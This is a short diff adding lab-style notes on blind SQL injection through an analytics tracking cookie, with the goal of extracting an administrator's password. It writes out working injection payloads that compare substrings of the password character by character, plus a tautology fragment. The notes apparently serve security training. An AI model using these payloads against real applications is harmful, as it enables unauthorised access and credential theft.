@@ -1,0 +1,14 @@
+- Application uses tracking cookie for analytics
+- Performs a SQL query containing value of submitted cookie
+- Results of SQL query are not returned, but "Welcome back" message if query returns (true)
+- DB contains a different table called 'users'
+---> Columns called 'username' and 'password'
+
+1) Exploit the blind SQLi vulnerability to find password of administrator username
+
+
+' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's 
+
+' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'a 
+
+AND '1'='1
